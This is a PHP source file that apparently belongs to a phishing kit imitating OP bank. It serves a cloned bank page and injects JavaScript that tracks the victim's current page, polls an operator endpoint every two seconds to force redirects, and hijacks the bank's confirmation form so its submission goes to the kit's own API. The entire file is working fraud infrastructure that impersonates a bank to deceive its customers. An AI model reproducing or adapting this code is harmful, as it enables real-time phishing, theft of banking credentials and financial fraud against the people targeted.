<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'OP');
$htmlContent = file_get_contents(__DIR__ . '/opbank4.html');

$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);

$adminScript = '';
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            fetch(\'/api/save-op-confirm\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(\'Network response was not ok\');
                }
                return response.json();
            })
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else if (data.message) {
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error(\'Error:\', error);
            });
            
            return false;
        }
        
        function initForm() {
            const form = document.getElementById(\'opConfirmForm\');
            if (form) {
                form.onsubmit = null;
                form.action = \'#\';
                form.addEventListener(\'submit\', function(e) {
                    handleFormSubmit(e);
                    return false;
                }, true);
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            setTimeout(initForm, 100);
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</body>') !== false) {
    $htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
} else {
    $htmlContent = $htmlContent . $adminScript;
}

$content = ob_get_clean();
echo $htmlContent;
?>

